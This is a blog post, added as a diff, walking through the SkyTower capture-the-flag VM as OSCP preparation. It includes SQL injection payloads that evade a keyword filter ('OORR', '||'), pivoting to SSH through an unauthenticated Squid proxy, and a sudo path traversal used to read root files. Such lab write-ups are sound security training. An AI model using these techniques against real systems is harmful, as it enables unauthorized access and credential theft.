@@ -1,0 +1,207 @@
+---
+layout: post
+title: "SkyTower writeup"
+subtitle: "~ Walkthrough of SkyTower machine ~"
+date: 2017-10-31
+author: V3ded
+category: CTF
+tags: blog ctf pentesting 
+finished: true
+excerpt_separator: <!--more-->
+---
+
+# Introduction
+
+Next walkthrough [VM](https://www.vulnhub.com/entry/skytower-1,96/){:target="_blank"} was made by Telspace Systems for a BSidesCPT security summit. Rated intermediate difficulty and assigned to 'todo' machines as preparation for OSCP I decided to give it a try. *Time to start!* <!--more-->
+
+***
+
+# Recon
+
+Start with **netdiscover** to find the initial SkyTower's IP:
+
+```console
+ Currently scanning: 192.168.31.0/16   |   Screen View: Unique Hosts                                           
+                                                                                                               
+ 22 Captured ARP Req/Rep packets, from 9 hosts.   Total size: 1320                                             
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 192.168.1.12    [REDACTED]           1       60      Apple, Inc.                                                 
+ 192.168.1.12    [REDACTED]           2       120     AzureWave Technology Inc.                                   
+ 192.168.1.1     [REDACTED]           8       480     ADB Broadband Italia                                        
+ 192.168.1.16    08:00:27:73:b0:c     9       2       120  PCS Systemtechnik GmbH                                      
+ 192.168.1.10    [REDACTED]           1       60      Unknown vendor                                              
+ 192.168.1.11    [REDACTED]           1       60      Unknown vendor                                              
+ 192.168.1.14    [REDACTED]           1       60      LG Innotek                                                  
+ 0.0.0.0         [REDACTED]           2       120     Apple, Inc.                                                 
+ 192.168.1.17    [REDACTED]           4       240     Apple, Inc.                                                 
+
+```
+
+Our target is **192.168.1.16**!
+
+Proceed with **nmap** scan to find open ports and their services:
+
+```console
+root@EdgeOfNight:~# nmap -A -T5 -sS 192.168.1.16
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2017-10-31 12:43 GMT
+Warning: 192.168.1.16 giving up on port because retransmission cap hit (2).
+Nmap scan report for 192.168.1.16
+Host is up (0.00034s latency).
+Not shown: 997 closed ports
+PORT     STATE    SERVICE    VERSION
+22/tcp   filtered ssh
+80/tcp   open     http       Apache httpd 2.2.22 ((Debian))
+|_http-server-header: Apache/2.2.22 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+3128/tcp open     http-proxy Squid http proxy 3.1.20
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:GET
+|_http-server-header: squid/3.1.20
+|_http-title: ERROR: The requested URL could not be retrieved
+MAC Address: 08:00:27:73:B0:C9 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X
+OS CPE: cpe:/o:linux:linux_kernel:3.2
+OS details: Linux 3.2, Linux 3.2 - 3.16
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.34 ms 192.168.1.16
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 30.75 seconds
+```
+
+Nmap scan shows, that there is a running HTTP Apache web server. Upon loading the page in a browser we get a result:
+
+<a href="/img/blog/skytower/skytower-01.png" target="_blank"><img class="centerImgLarge" src="/img/blog/skytower/skytower-01.png"></a>
+
+An interesting page and a login functionality! I wonder how it reacts to SQL statements? Login crashes when we input a simple apostrophe - `'` inside username field. Clear sign of an SQL injection. 
+
+<a href="/img/blog/skytower/skytower-02.png" target="_blank"><img class="centerImgHuge" src="/img/blog/skytower/skytower-02.png"></a>
+
+A common login bypass would be a crafted request which looks very similar to: `' OR 1=1#`. Unfortunately there is a filter which prevents the injection:
+ 
+<a href="/img/blog/skytower/skytower-03.png" target="_blank"><img class="centerImgHuge" src="/img/blog/skytower/skytower-03.png"></a>
+
+`OR` and `=` completely dissapeared from the query. Hmm... A certain filter is blocking SQL keywords to prevent a disaster. If you don't know what to do, you should read an [article](https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF){:target="_blank"} about bypassing filters / WAFs by OWASP. After enough trial and error I found a string which worked. `' OORR 1=1#` bypasses the defenses and puts us past the login!  
+
+<a href="/img/blog/skytower/skytower-04.png" target="_blank"><img class="centerImgHuge" src="/img/blog/skytower/skytower-04.png"></a>
+
+Alternatively, `' || 1=1#` will work as well. 
+
+***
+
+# Exploitation
+
+* Username: john
+* Password: hereisjohn
+
+Nice! Before using the credentials we need to get past `filtered` port issue. If you remember, our *nmap* scan only showed SSH as filtered. Not opened. We can use **Squid proxy** (port:*3128*) to solve the problem. Doing a bit of enumeration, it is easy to see that the proxy isn't password protected and therefore we can add it to our proxychains list for later usage. 
+
+Edit `/etc/proxychains.conf` file and add:
+```console
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+http	192.168.1.16	3128 #SQUID PROXY
+``` 
+
+After that just connect to SSH via proxychains:
+```console
+proxychains ssh john@192.168.1.16
+``` 
+
+<a href="/img/blog/skytower/skytower-05.png" target="_blank"><img class="centerImgMedium" src="/img/blog/skytower/skytower-05.png"></a>
+
+Unfortunately the connection immediately drops. Most probably because `.bashrc` file has an *exit* instruction somewhere within it. To circumvent this, I just rename `.bashrc` on the target system and retry the login. This can be done by chaining a command right after doing SSH connect:
+
+<a href="/img/blog/skytower/skytower-06.png" target="_blank"><img class="centerImgMedium" src="/img/blog/skytower/skytower-06.png"></a>
+
+Because `.bashrc` file has no longer an effect on our session, we are greeted with a nice shell! 
+
+> Theoretically you can run any command by the previously mentioned method. Feel free to bypass the restriction any way you feel.
+
+***
+
+# Privilege Escalation
+
+Browsing around the filesystem I notice there is an active instance of *MYSQL* database running. You can either guess the correct password (default) or find it inside `/var/www/login.php`.  
+
+<a href="/img/blog/skytower/skytower-07.png" target="_blank"><img class="centerImgMedium" src="/img/blog/skytower/skytower-07.png"></a>
+
+Funny or not, you can also see the filter which prevented us from doing simple SQL injections. Enough of talking though. Connect to the database and get the sweet credentials!
+
+```console
+john@SkyTower:/var/www$ mysql -u root -p
+Enter password: root
+
+mysql> SHOW DATABASES;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| SkyTech            |
+| mysql              |
+| performance_schema |
++--------------------+
+4 rows in set (0.00 sec)
+
+mysql> USE SkyTech;
+Database changed
+
+mysql> SHOW TABLES;
++-------------------+
+| Tables_in_SkyTech |
++-------------------+
+| login             |
++-------------------+
+1 row in set (0.00 sec)
+
+mysql> SELECT * FROM login;
++----+---------------------+--------------+
+| id | email               | password     |
++----+---------------------+--------------+
+|  1 | john@skytech.com    | hereisjohn   |
+|  2 | sara@skytech.com    | ihatethisjob |
+|  3 | william@skytech.com | senseable    |
++----+---------------------+--------------+
+3 rows in set (0.00 sec)
+```
+If some of the queries are unclear I recommend reading a MySQL [cheatsheet](https://www.digitalocean.com/community/tutorials/a-basic-mysql-tutorial){:target="_blank"} by DigitalOcean. 
+
+Afterwards I tried to login as Wiliam, but his credentials don't work. However Sara's do! She has the same *exit* annoyance thingy in `.bashrc` as John, but fear not. We already know how to go around it :).
+
+<a href="/img/blog/skytower/skytower-08.png" target="_blank"><img class="centerImgMedium" src="/img/blog/skytower/skytower-08.png"></a>
+
+Then do `sudo -l`:
+
+<a href="/img/blog/skytower/skytower-09.png" target="_blank"><img class="centerImgHuge" src="/img/blog/skytower/skytower-09.png"></a>
+
+which reveals we can run `/bin/cat /accounts/` under root privileges. This alows for a path traversal and `cat`-ing of protected content. In my case the root flag.
+
+```console
+sara@SkyTower:~$ sudo cat /accounts/../root/flag.txt
+Congratz, have a cold one to celebrate!
+root password is theskytower
+sara@SkyTower:~$ 
+```
+
+Just do `su root`, enter the password and BAAM! 
+
+<a href="/img/blog/skytower/skytower-10.png" target="_blank"><img class="centerImgHuge" src="/img/blog/skytower/skytower-10.png"></a>
+
+### Rooted!
+
+***
+
+# Conclusion
+
+In my opinion a prety solid box. I learnt few new things and had fun while doing so. What more can you wish for?! My thanks goes to **bitvijays** for providing me with guidance when I got stuck once or twice. Check out his blog at <http://bitvijays.github.io/> ! If there are any questions feel free to reach out to me by [Twitter](/about/){:target="_blank"} or leaving a comment down bellow.  
+
+~V3
